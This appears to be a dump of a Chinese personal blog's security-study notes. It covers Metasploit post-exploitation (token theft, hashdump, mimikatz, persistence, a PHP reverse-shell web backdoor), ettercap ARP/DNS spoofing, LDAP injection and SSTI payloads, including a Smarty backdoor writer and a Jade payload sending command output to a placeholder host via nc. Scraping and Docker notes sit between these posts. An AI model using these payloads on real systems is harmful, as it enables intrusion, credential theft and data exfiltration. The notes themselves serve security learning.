systeminfo 查看系统信息，查找目标打的补丁，然后在Exploit-DB和安全焦点上查找目标没有打的补丁，然后找到相应漏洞名称，search它，之后利用攻击即可。 令牌窃取kerberos协议。假冒令牌。 123456getuidgetsystemuse incognitolist_token -u查找到可利用的令牌即登录的用户名称impersonate_token WIN-57\\\\Administrator 抓取密码hashdump 注意需要系统权限。 run windows/gather/smart_hashdump 绕过开启了UAC的Windows7. 或者使用mimikatz（system权限） 1234567getuidgetsystemsysinfoload mimikatzmsv 获取密码hash值kerberos 抓取系统票据wdigest 获取系统账户信息 后门使用persistence 12run persistence -hrun persistence -A -S -U -i 60 -p 4321 -r 192.168.1.x A: 字段启动payload S：系统启动时字段加载 U: 用户登录时加载 X：开机时启动 i：发起连接的时间间隔 P：监听反连的端口号 r: 目标IP Web后门使用msfvenom PHP: msfvenom -p php/meterpreter/reverse_tcp lhost=xx -f raw &gt; web.php 上传PHP文件到网站后，启动msf，use exploit/multi/handler，然后设置lhost, payload，启动监听。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"msf后渗透过程","slug":"msf后渗透过程","permalink":"https://ggyggy666.github.io/tags/msf%E5%90%8E%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"BeautifulSoup的简单使用","slug":"BeautifulSoup的简单使用","date":"2020-09-25T05:44:30.000Z","updated":"2020-09-26T12:47:41.084Z","comments":true,"path":"2020/09/25/BeautifulSoup的简单使用/","link":"","permalink":"https://ggyggy666.github.io/2020/09/25/BeautifulSoup%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","excerpt":"","text":"创建对象soup = BeautifulSoup(str) str是字符串。 解析器默认是html.parser, 可以下载lxml, html5lib。 使用：soup = BeautifulSoup(str, &#39;html.parser&#39;); 将html.parser替换成其它即可。 定位标签 soup.title 返回值：&lt;title&gt;ggy&lt;/title&gt; 会将标签和里面的字符串一起输出。 soup.title.name 返回值：title 返回的是标签名。 soup.p[&#39;class&#39;] class是p标签的class属性，这句返回class属性的值。 soup.a 有多个a标签时只返回第一个。 取标签里的字符串soup.title.string 返回标签的字符串。可以用Unicode将它直接转换成Unicode字符。 替换标签里的字符串soup.title.string.replace_with(&quot;hello&quot;) 返回就是：&lt;title&gt;hello&lt;/title&gt; prettify美化输出soup.title.prettify 输出成正常HTML格式 查找find_all和findsoup.find_all(&#39;b&#39;) 查找所有的&lt;b&gt;标签，括号里内容为查找条件。可以用正则表达式。 soup.find_all(re.compile(&quot;b&quot;)) 可以用limit限制返回的个数 soup.find_all(&quot;b&quot;, limit=2) 直接根据属性定位： soup.find_all(&quot;a&quot;) soup.find_all(id=&quot;test&quot;) soup.find_all(id=re.compile(&quot;test&quot;)) soup.find_all(id=&quot;test&quot;, href=&quot;www.baidu.com&quot;) 如果属性是data-foo，不能这么做，需要传字典 soup.find_all(attrs={&quot;data-foo&quot;: &quot;value&quot;}) 按类class查找，用class_ soup.find_all(class_=&quot;test&quot;) 根据string内容定位 soup.find_all(string=&quot;hello&quot;) find只返回一个匹配结果, 其它与find_all类似 soup.find(&quot;title&quot;) select选择器soup.select(&quot;title&quot;) 通过标签逐层查找 soup.select(&quot;html head title&quot;) 返回的是title那一行 soup.select(&quot;p &gt; a&quot;) 返回的是在p标签下的所有a标签 soup.select(&quot;.sister&quot;) 通过类名的值寻找。即需要：class=sister soup.select(&quot;#link1&quot;) 或者 soup.select(&quot;a#link1&quot;) 通过id的值进行查找。需要：id=link1 soup.select(&#39;a[href^=&quot;http://www.bai&quot;]&#39;) 通过属性值查找,找href的值是以http://www.bai开头的。^可以换成$,*，当然直接等号的话要写完整值。 爬取小说1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from bs4 import BeautifulSoupimport re, threadingimport requestsimport sysreload(sys)sys.setdefaultencoding(&#39;utf-8&#39;) &#x2F;&#x2F;防止出现一些编码错误list &#x3D; []agent &#x3D; &#123;&quot;User-Agent&quot;:&quot;firefox 5.0&quot;&#125;count &#x3D; 0def get_content(url): &#x2F;&#x2F;返回URL的页面内容 r &#x3D; requests.get(url, headers&#x3D;agent); r.encoding &#x3D; &#39;utf-8&#39; return r.textdef get_url(url, add, start): &#x2F;&#x2F;取页面每个章节的URL r &#x3D; get_content(url) soup &#x3D; BeautifulSoup(r, &quot;lxml&quot;) s &#x3D; soup.dl.find_all(&quot;a&quot;) for i in range(0, add+start): l &#x3D; s[i][&#39;href&#39;] furl &#x3D; url + l list.append(furl) &#x2F;&#x2F;将URL放到一个列表中 print(&quot;the &quot;+s[i-1].string+&quot; chapters is the end you wang to download&quot;)def download(url, name): &#x2F;&#x2F;访问URL，将页面的文本写入文件 r &#x3D; get_content(url); soup &#x3D; BeautifulSoup(r, &quot;lxml&quot;); s &#x3D; soup.find(&quot;h1&quot;) title &#x3D; s.string content &#x3D; soup.find(id&#x3D;&quot;content&quot;) content &#x3D; str(content) content &#x3D; content.replace(&#39;&lt;div id&#x3D;&quot;content&quot;&gt;&lt;!--go--&gt;&#39;,&quot;\\n&quot;) content &#x3D; content.replace(&quot;&lt;&#x2F;div&gt;&quot;,&quot;\\n&quot;) content &#x3D; content.replace(&quot;&lt;!--over--&gt;&quot;,&quot; &quot;) content &#x3D; content.replace(&quot;&lt;br&#x2F;&gt;&quot;,&quot;\\n&quot;) with open(name+&quot;.txt&quot;,&quot;a&quot;) as f: content &#x3D; title + &quot;\\n\\n&quot; + content f.write(content) if((count+1)%50&#x3D;&#x3D;0): print(&quot;you have downloaded 50 chapters&quot;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: name &#x3D; raw_input(&quot;input the name you wang to download: &quot;) &#x2F;&#x2F;下载的小说名字，以便生成该名字的文件 url &#x3D; raw_input(&quot;Please enter fiction&#39;s url$ &quot;)&#x2F;&#x2F;输入小说的主页面URL start &#x3D; input(&quot;start chapter: &quot;)&#x2F;&#x2F;输入要从哪一章开始下载 add &#x3D; input(&quot;add chapter count: &quot;)&#x2F;&#x2F;输入要下载多少章 get_url(url, add, start) count &#x3D; start for j in range(start, add+start+1):&#x2F;&#x2F;遍历URL进行下载 download(list[j], name) count +&#x3D; 1 神武仙踪： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from bs4 import BeautifulSoupimport re, threadingimport requestsimport sysreload(sys)sys.setdefaultencoding(&#39;utf-8&#39;)list &#x3D; []agent &#x3D; &#123;&quot;User-Agent&quot;:&quot;firefox 5.0&quot;&#125;count &#x3D; 0def get_content(url): r &#x3D; requests.get(url, headers&#x3D;agent); r.encoding &#x3D; &#39;utf-8&#39; return r.textdef get_url(url, add, start): r &#x3D; get_content(url) soup &#x3D; BeautifulSoup(r, &quot;lxml&quot;) s &#x3D; soup.dl.find_all(&quot;a&quot;) for i in range(0, add+start): l &#x3D; s[i][&#39;href&#39;] furl &#x3D; url + l list.append(furl) print(&quot;the &quot;+s[i-1].string+&quot; chapters is the end you wang to download&quot;)def download(url, name): r &#x3D; get_content(url); soup &#x3D; BeautifulSoup(r, &quot;lxml&quot;); s &#x3D; soup.find(&quot;h1&quot;) title &#x3D; s.string content &#x3D; soup.find(id&#x3D;&quot;content&quot;) content &#x3D; str(content) content &#x3D; content.replace(&#39;&lt;div id&#x3D;&quot;content&quot;&gt;&lt;!--go--&gt;&#39;,&quot;\\n&quot;) content &#x3D; content.replace(&quot;&lt;&#x2F;div&gt;&quot;,&quot;\\n&quot;) content &#x3D; content.replace(&quot;&lt;!--over--&gt;&quot;,&quot; &quot;) content &#x3D; content.replace(&quot;&lt;br&#x2F;&gt;&quot;,&quot;\\n&quot;) with open(name+&quot;.txt&quot;,&quot;a&quot;) as f: content &#x3D; title + &quot;\\n\\n&quot; + content f.write(content) if((count+1)%50&#x3D;&#x3D;0): print(&quot;you have downloaded 50 chapters&quot;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: name &#x3D; raw_input(&quot;input the name you wang to download: &quot;) url &#x3D; raw_input(&quot;Please enter fiction&#39;s url$ &quot;) start &#x3D; input(&quot;start chapter: &quot;) add &#x3D; input(&quot;add chapter count: &quot;) get_url(url, add, start) count &#x3D; start for j in range(start, add+start+1): download(list[j], name) count +&#x3D; 1","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"BeautifulSoup的简单使用","slug":"BeautifulSoup的简单使用","permalink":"https://ggyggy666.github.io/tags/BeautifulSoup%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"msf的使用-工作区、信息收集","slug":"msf的使用-工作区、信息收集","date":"2020-08-02T15:47:29.000Z","updated":"2020-08-03T03:52:07.200Z","comments":true,"path":"2020/08/02/msf的使用-工作区、信息收集/","link":"","permalink":"https://ggyggy666.github.io/2020/08/02/msf%E7%9A%84%E4%BD%BF%E7%94%A8-%E5%B7%A5%E4%BD%9C%E5%8C%BA%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"今天继续学习msf。","text":"今天继续学习msf。 工作区 查看工作区状态：workspace 显示工作区详细信息：workspace -v 添加工作区：workspace -a ggy 切换工作区：workspace ggy 重命名工作区：workspace -r ggy ggy666 删除某个工作区：workspace -d ggy 删除所有工作区：workspace -D 信息管理 管理主机：hosts 管理服务：services 管理认证信息：creds 管理战利品：loot 管理备注信息：notes 显示漏洞信息：vulns 保存工作区信息db_export -f xml ggy, xml是格式，ggy是保存的文件名。 快速搜索模块需要重新创建缓存：db_rebuild_cache。 各模块使用https://weread.qq.com/web/reader/95f320e0718ac6ba95fb88ak33e3289021c33e75ff09694 sqlmap的使用123456789load salmapsqlmapapi -s -p 8875 &#x2F;&#x2F;监听8875端口sqlmap_connect 127.0.0.1sqlmap_new_task &#x2F;&#x2F;新建任务，得到一个ID如1sqlmap_start_task 1 &quot;www.baidu.com&quot; &#x2F;&#x2F;启动任务1,扫描百度sqlmap_list_task &#x2F;&#x2F;查看运行的任务sqlmap_get_status &#x2F;&#x2F;查看运行状态，terminated是完成了，running正在运行sqlmap_get_data &#x2F;&#x2F;获取扫描到的漏洞sqlmap_get_log 1 &#x2F;&#x2F;查看扫描日志","categories":[{"name":"kali","slug":"kali","permalink":"https://ggyggy666.github.io/categories/kali/"}],"tags":[{"name":"msf的使用-工作区、信息收集","slug":"msf的使用-工作区、信息收集","permalink":"https://ggyggy666.github.io/tags/msf%E7%9A%84%E4%BD%BF%E7%94%A8-%E5%B7%A5%E4%BD%9C%E5%8C%BA%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"keywords":[{"name":"kali","slug":"kali","permalink":"https://ggyggy666.github.io/categories/kali/"}]},{"title":"msf的使用-初始化及调用Nessus","slug":"msf的使用","date":"2020-07-31T02:41:19.000Z","updated":"2020-07-31T14:16:06.976Z","comments":true,"path":"2020/07/31/msf的使用/","link":"","permalink":"https://ggyggy666.github.io/2020/07/31/msf%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"今天学习msf的简单使用。","text":"今天学习msf的简单使用。 开启数据库/etc/init.d/postgresql start, 关闭就改为stop即可。 也可以查看数据库状态： /etc/init.d/postgresql status 第一次使用时需要初始化数据库：msfdb init。 开启msfmsfconsole，打开msf。 db_status，可以看到已经连接到了Postgresql。 设置msfconsole设置提示信息：set Prompt ggy, 那么msf5&gt; 就会变成：ggy&gt; 设置提示符：set PromptChar @, 那么会变成：ggy@ 启用计时功能：set TimestampOutput true, 默认是false 使用日志，分为控制台日志和会话日志。 控制台日志记录用户的输入和输出，使用：set ConsoleLogging true，日志保存在：/root/.msf4/logs/console.log。 会话日志记录成功攻击后建立会话后的输出信息，使用：set SessionLogging true, 日志保存在：/root/.msf4/logs/session文件。 也可以设置日志记录的详细级别：0-3，值越大，越详细：set LogLevel 2。默认是0. 可以设置模块的级别：set MinimumRank 300。 msf调用nessus在root目录下有nessus.deb，然后：dpkg -i nessus.deb安装。 登录Nessus服务启动服务：/etc/init.d/nessusd start 登录服务：浏览器中输入：https://kali:8834, 信任该链接，创建一个账号，使用激活码：1994-B5A7-8052-D7A0-BBCD。下载完初始化后用账号登录。 msf远程调用Nessus加载Nessus插件：load nessus 查看所有命令：nessus_help 登录到Nessus服务： nessus_connect admin:123456@IP:8834 使用扫描策略 事先在http://127.0.0.1:8834中创建一个自定义扫描策略，然后msf中：nessus_policy_list查看扫描策略，找到自定义的扫描策略，注意它的UUID 创建扫描任务 nessus_scan_new 策略的UUID &quot;Local Scan&quot; &quot;Vuln Scan&quot; 扫描目标 nessus_scan_new ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66 &quot;Local Scan&quot; &quot;Vuln Scan&quot; 192.168.3.1/24 Local Scan是描述信息，Vuln Scan是扫描名称。 启动扫描任务 nessus_scan_launch 9 9只是个扫描任务的编号。 查看扫描运行的状态 nessus_scan_list 查看扫描报告 nessus_report_hosts 9 9就是那个编号。 查看扫描到的某个主机的系统、漏洞信息 主机前面有个host ID，比如：9105，那么 nessus_report_host_details 9105 只查看所有扫描到的漏洞信息 nessus_report_vulns 9 只查看某个主机的漏洞信息 vulns --rhosts 主机IP","categories":[{"name":"kali","slug":"kali","permalink":"https://ggyggy666.github.io/categories/kali/"}],"tags":[{"name":"msf的使用","slug":"msf的使用","permalink":"https://ggyggy666.github.io/tags/msf%E7%9A%84%E4%BD%BF%E7%94%A8/"}],"keywords":[{"name":"kali","slug":"kali","permalink":"https://ggyggy666.github.io/categories/kali/"}]},{"title":"ettercap进行中间人攻击","slug":"ettercap进行中间人攻击","date":"2020-07-30T13:00:47.000Z","updated":"2020-07-30T13:43:12.557Z","comments":true,"path":"2020/07/30/ettercap进行中间人攻击/","link":"","permalink":"https://ggyggy666.github.io/2020/07/30/ettercap%E8%BF%9B%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/","excerpt":"今天使用ettercap进行中间人攻击。","text":"今天使用ettercap进行中间人攻击。 过程ARP欺骗打开ettercap： ettercap -G 默认选择打勾。点击左上方的搜索按钮，搜索后点击搜索按钮旁边的按钮。 将网关添加到target1，受害者的主机ip添加到target2. 点击右上方第一个：MITM menu, 选择arp Posining, 点击OK即可进行arp欺骗。 这个时候是没网的。需要：echo 1 &gt; /proc/sys/net/ipv4/ip_forward。 dns欺骗点击右上角第三个按钮，选择 Plugins -&gt; Manage plugins, 然后双击dns_spoof。 如果需要自定义，当Windows访问www.baidu.com时，解析到我们攻击者的地址，需要修改配置： vim /etc/ettercap/etter.dns 找到Microsoft.com那里，在那个位置加上：www.baidu.com A 127.0.0.1。 修改后，整个ARP欺骗和DNS欺骗过程都需要重来，即关闭ettercap，然后再次：ettercap -G 重新来过一遍后，在Windows的命令行中，先： ipconfig /flushdns 然后：ping www.baidu.com 发现解析到了127.0.0.1， 可惜访问的时候是拒绝连接的。 driftnet获取图片driftnet -i eht0","categories":[{"name":"kali","slug":"kali","permalink":"https://ggyggy666.github.io/categories/kali/"}],"tags":[{"name":"ettercap进行中间人攻击","slug":"ettercap进行中间人攻击","permalink":"https://ggyggy666.github.io/tags/ettercap%E8%BF%9B%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"}],"keywords":[{"name":"kali","slug":"kali","permalink":"https://ggyggy666.github.io/categories/kali/"}]},{"title":"docker的使用","slug":"docker的使用","date":"2020-07-29T14:19:46.000Z","updated":"2020-07-30T04:03:50.208Z","comments":true,"path":"2020/07/29/docker的使用/","link":"","permalink":"https://ggyggy666.github.io/2020/07/29/docker%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"最近开始好好学习一下docker。","text":"最近开始好好学习一下docker。 安装在centos7上安装docker：https://www.runoob.com/docker/centos-docker-install.html 启动：systemctl start docker 运行hello-world：docker run hello-world 配置镜像加速器使用阿里云的 12345678sudo mkdir -p &#x2F;etc&#x2F;dockersudo tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;&#123; &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;lipcgnab.mirror.aliyuncs.com&quot;]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker 使用 查看容器：docker ps 查看所有容器（包括停止的）：docker ps -a 启动容器：docker run -itd 镜像名 可加命令, 如：docker run -it ubuntu /bin/bash 停止容器：docker stop ID号 获取镜像：docker pull ubuntu 启动一个已停止的容器：docker start 容器ID 运行容器时起一个别名：docker run -itd --name ggy ubuntu /bin/bash 使用-d后，容器进入了后台运行。此时还想进入容器的话： 使用attach: docker attach 容器ID, 使用exit 退出，但退出也会导致容器停止运行。 推荐使用exec: docker exec -it 容器ID /bin/bash , 使用exit退出后不会导致容器停止。 导出和导入容器： 导出：docker export 容器ID &gt; ggy.tar 导入：cat docker/ggy.tar | docker import - test/ubuntu:v1, 后面这个是镜像名：test/ubuntu, v1是TAG。当然可以指定远程的容器：docker import http://xxx.com/ggy.tar test/ubuntu 删除容器： 删除一个：docker rm -f 容器ID 或者：docker rm 容器的名字, 容器必须停止了才能删除。 清楚所有处于终止状态的容器：docker container prune 运行web应用123docker pull training&#x2F;webapp &#x2F;&#x2F;拉取镜像docker run -d -p 5000:5000 training&#x2F;webapp python app.pydocker ps 镜像管理 查看已有镜像：docker images 获取镜像：docker pull ubuntu:13.10, 镜像名:Tag。 查找镜像：docker search httpd 使用镜像：docker run httpd 删除镜像：docker rmi 镜像名 更新镜像：首先使用镜像创建一个容器：docker run -i -t ubuntu:15.10 /bin/bash, 在容器中使用apt-get update, exit退出。然后使用：`docker commit -m=”镜像描述信息” -a=”镜像作者” 容器ID 要创建的镜像名称 给镜像设置标签：docker tag 镜像ID 镜像名:tag 从零开始构建镜像： 新建一个Dockerfile文件，里面的内容是： 12345678910FROM centos:6.7MAINTAINER Fisher &quot;fisher@sudops.com&quot;RUN &#x2F;bin&#x2F;echo &#39;root:123456&#39; |chpasswdRUN useradd runoobRUN &#x2F;bin&#x2F;echo &#39;runoob:123456&#39; |chpasswdRUN &#x2F;bin&#x2F;echo -e &quot;LANG&#x3D;\\&quot;en_US.UTF-8\\&quot;&quot; &gt;&#x2F;etc&#x2F;default&#x2F;localEXPOSE 22EXPOSE 80CMD &#x2F;usr&#x2F;sbin&#x2F;sshd -D 使用docker build新建镜像：docker build -t 镜像名 ., .表示Dockerfile在当前目录。 定制nginx镜像123456789101112mkdir Dockerfilecd Dockerfilevi Dockerfile输入：FROM nginxRUN echo &#39;这是一个本地构建的nginx镜像&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.htmlFROM centosRUN yum install wget \\ &amp;&amp; wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot; \\ &amp;&amp; tar -xvf redis.tar.gzdocker build -t nginx:test . 部署nginx123456789101112docker pull nginx:latestdocker run --name nginx -p 8080:80 -d nginx 可以直接访问：118.178.88.139:8080修改默认首页：echo &quot;Hello Docker&quot; &gt;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html或者：docker exec -it 容器ID &#x2F;bin&#x2F;bash进入容器后：apt-get updateapt-get install vimvim &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html修改即可。但是这样每次都要使用docker exec -it进入，很麻烦。 挂载文件，将docker中的nginx的文件映射到服务器中的文件，从而只需要修改服务器中的文件即可。 123456cd &#x2F;mkdir docker &amp;&amp; cd dockermkdir nginx &amp;&amp; cd nginxmkdir conf,conf.d,html,logsdocker run --name nginx -d -p 8080:80 -v &#x2F;docker&#x2F;nginx&#x2F;html:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html nginx这个只是挂载了首页的网页文件，配置文件那些没有。如果想的话，需要先进入容器中将配置文件那些内容复制出来到要挂载的文件目录下。 docker部署dvwa12docker pull dvwadocker run -d --name dvwa -p 8080:80 c0ny1&#x2F;dvwa:v1.9 部署bwapp 123docker pull raesene&#x2F;bwappdocker run -d -p 8080:80 raesene&#x2F;bwapp访问：118.178.88.139:8080&#x2F;install.php","categories":[{"name":"docker","slug":"docker","permalink":"https://ggyggy666.github.io/categories/docker/"}],"tags":[{"name":"docker的使用","slug":"docker的使用","permalink":"https://ggyggy666.github.io/tags/docker%E7%9A%84%E4%BD%BF%E7%94%A8/"}],"keywords":[{"name":"docker","slug":"docker","permalink":"https://ggyggy666.github.io/categories/docker/"}]},{"title":"kali-Linux的使用","slug":"kali-Linux的使用","date":"2020-07-21T12:37:18.000Z","updated":"2020-07-28T13:14:47.788Z","comments":true,"path":"2020/07/21/kali-Linux的使用/","link":"","permalink":"https://ggyggy666.github.io/2020/07/21/kali-Linux%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"今天开始学习kali。","text":"今天开始学习kali。 命令重置root用户密码passwd root 创建普通用户adduser 用户名 然后输入密码，Full Name可以随便填ggy也行，其它就一直回车。 与Windows共享文件 Windows上创建一个文件夹：ggy-kali。 右击文件夹，属性-&gt;共享-&gt;点击共享-&gt;选择everyone-&gt;添加-&gt;权限级别选择读/写入-&gt;完成。 选择kali那个虚拟机，右键点击设置-&gt;选项-&gt;共享文件夹-&gt;添加选择Windows中的ggy-kali mkdir /mnt/hgfs/share。创建共享文件夹目录。如果没有hgfs，手动创建。 /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs/share/ -o subtype=vmhgfs-fuse,allow_other vmware-hgfsclient，查看共享文件夹。 在文件系统下找到该共享文件夹，拖动到桌面即可。 CutyCapt抓取屏幕截图 cutycapt --url=http://www.baidu.com --out=baidu.jpg --min-width=300 --min-height=250 抓取指定网页的截图。 查看图片：ls -&gt; apt-get install imagemagick -&gt; display baidu.jpg。 DNS侦查123whois baidu.com &#x2F;&#x2F;baidu.com的信息dnsrecon -t std -d baidu.com &#x2F;&#x2F;获得SOA记录、IP(IPv4)等dnsdict6 baidu.com &#x2F;&#x2F;获得IPv6地址 路由信息12traceroute www.baidu.comhping3 -S www.baidu.com -p 80 -c 3 &#x2F;&#x2F;类似Windows的ping，得到路由信息 theHarvester收集域名信息 -d, 确定目标网站 -b, 确定使用什么搜索引擎来获取信息，如：Google, baidu, Bing -f, 保存成文件 theHarvester -d baidu.com -b baidu Metagoofil下载目标网站的文件（doc, docx, pdf, ppts, xls, xlsx）并提取用户名、软件版本等信息 1metagoofil -d baidu.com -t doc -l 25 -o baidu -f baidu.html tor匿名网络代理123456781. apt-get install tor2. 编辑&#x2F;etc下的proxychains.conf 将dynamic_chains前的#去掉，在strict_chains前加一个#。3. 在网上找到开放代理，添加到proxyList中（socket5代理）4. 启动tor, service tor start5. 验证启动状态：service tor status6. 启动浏览器打开一个网站：iceweasel www.baidu.com7. 调用tor路由：proxychainsiceweasel www.baidu.com","categories":[{"name":"kali","slug":"kali","permalink":"https://ggyggy666.github.io/categories/kali/"}],"tags":[{"name":"kali-Linux的使用","slug":"kali-Linux的使用","permalink":"https://ggyggy666.github.io/tags/kali-Linux%E7%9A%84%E4%BD%BF%E7%94%A8/"}],"keywords":[{"name":"kali","slug":"kali","permalink":"https://ggyggy666.github.io/categories/kali/"}]},{"title":"LDAP注入漏洞总结","slug":"LDAP注入漏洞总结","date":"2020-07-20T07:45:33.000Z","updated":"2020-07-20T08:27:33.882Z","comments":true,"path":"2020/07/20/LDAP注入漏洞总结/","link":"","permalink":"https://ggyggy666.github.io/2020/07/20/LDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"今天总结一下LDAP注入漏洞。","text":"今天总结一下LDAP注入漏洞。 原理LDAP，轻量级目录访问协议，用来存储一些数据，类似数据库，因此也有查询的语法。如果注入恶意payload，使得原来语句的查询结构被破坏，将执行攻击者所希望查询的命令，从而获取数据。 使用： (name=John)，基本语法是这样，查找属性名为John的所有对象。注意都要圆括号。 如果有多个查询条件，使用&amp;。正常情况我们想到的应该是：(name=John)&amp;(pass=ggy)，但这个LDAP将符号提前，并且用一个圆括号括起来：(&amp;(name=John)(pass=ggy))。当然|也一样。！的话：(!name=John)，不知道属性名是John时，也可以用匹配：(name=*)。 检测方法 ?name=value)(test，OpenLDAP只检测第一个过滤器，ADAM都不允许两个过滤器。因此有用部分只是``?name=value`。这并没有什么用。 如果采用了&amp;或|或！这种才有用。可试试下面payload测试。 ?name=value)(test)。 ?name=value)(test))(&amp;(1=0 看回显判断是否存在LDAP注入。 AND注入1admin*)(objectClass&#x3D;*) &#x2F;&#x2F;有语法错误 1admin*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;* &#x2F;&#x2F;无语法错误 免密登录：?name=ggy)(&amp;), 不知道为什么网上的是：?name=ggy)(&amp;))。 提升权限：?directory=document)(security_level=*))(&amp;(directory=documents. OR注入1name&#x3D;username*)(objectClass&#x3D;void))(|objectClass&#x3D;void 盲注AND盲注：)(objectClass=*))(&amp;(objectClass=void。 123)(objectClass&#x3D;a*))(&amp;(object&#x3D;printer)(objectClass&#x3D;f*))(&amp;(object&#x3D;printer)(objectClass&#x3D;fa*))(&amp;(object&#x3D;printer objectclass是属性名，object是对象。 真实案例 username=*)(objectclass=* 与 username=!*)(objectclass=* 的回显不同。 username=admi*)(objectclass=*,匹配到了用户名，尝试绕过密码：username=admi*)(&amp;, 不行。 要知道继承了哪些objectclass。username=admin)(objectclass=top,burp爆破top位置。得到属性：mobile。 盲注手机号：username=admin)(mobile=*) 来源：https://xz.aliyun.com/t/5689#toc-9 参考文章 https://www.cnblogs.com/bendawang/p/5156562.html https://blog.csdn.net/quiet_girl/article/details/50716312 http://blog.nsfocus.net/preventing-ldap-injection-python-security-encoding/","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"LDAP注入漏洞总结","slug":"LDAP注入漏洞总结","permalink":"https://ggyggy666.github.io/tags/LDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"SSTI服务端模板注入","slug":"SSTI服务端模板注入","date":"2020-07-19T05:31:59.000Z","updated":"2020-07-19T09:58:16.255Z","comments":true,"path":"2020/07/19/SSTI服务端模板注入/","link":"","permalink":"https://ggyggy666.github.io/2020/07/19/SSTI%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"","text":"今天学习一下SSTI-服务端模板注入。 原理SSTI，服务端模板注入，既然是注入，那么其实也就类似HTML注入、SQL注入。服务端使用了模板引擎渲染用户的请求，用户的输入能够输出在页面中，并且没有对用户的输入进行严格的过滤。 模板引擎又分为客户端和服务端。 客户端模板引擎 模板引擎 例子 常规字符串 doT.js、dust.js、mustache.js DOM vue.js、Angular.js、React.js 服务端模板引擎 语言 例子 PHP Smarty、Twig Java Freemarker、Velocity Python Jinja2、Tornado、Mardo Ruby Slim、ERB NodeJS Jade 各语言检测payload 检测类似SQl注入加单引号检测，SSTI同样有简单的检测方法： ?name=49 传这样的参数进去，如果页面回显的是49，说明计算了7*7，因此存在SSTI。 进一步测试： ?name=ggy6OK 页面回显ggy6OK。这是因为是注释，会被忽略。 判断是哪种模板引擎使用49，返回49的是Twig, 返回7777777的是Jinja2。 其它未知。 漏洞利用FreeMarkerpayload 123&lt;#assigntest&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;&lt;#assignob&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt; 创建模板时新建一个实例，后续调用会使得命令执行。 Velocitypayload 1$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).wairFor() sleep 5为命令，可换成其它命令。 Smartypayload 12341. 任意读取文件&#123;self:getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;loginuid&quot;)&#125;2. 写文件创建后门&#123;Smarty_Internal_write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;&quot;,self::clearConfig())&#125; Twigpayload 1&#123;&#123;_self.env.setCache&#123;&quot;ftp:&#x2F;&#x2F;xxx:2121&quot;&#125;&#125;&#125;&#123;&#123;_self.env.loadTemplate&#123;&quot;backdoor&quot;&#125;&#125;&#125; setCache能改变Twig加载PHP文件的路径，因此可以RFI。 1&#123;&#123;_self.env.registerUndefinedFilterCallback&#123;&quot;exec&quot;&#125;&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125; getFilter里有危险函数call_user_func,通过传递的参数可以任意调用PHP函数，注册exec为filter的回调函数即可命令执行。 Jadepayload 1234- var x&#x3D;root.process- x&#x3D;x.mainModule.require- x&#x3D;x&#123;&#39;child_process&#39;&#125;&#x3D; x.exec&#123;&#39;id|nc xxx.net:80&#39;&#125; AngularJSpayload 123&lt;div&gt; &#123;&#123;a&#x3D;toString().constructor.prototype;a.charAt&#x3D;a.trim;$eval(&#39;a,alert(1),a&#39;)&#125;&#125;&lt;&#x2F;div&gt; 读取HTML，并将页面的输入或输出绑定JS变量表示的模型。 检测工具tplmap: 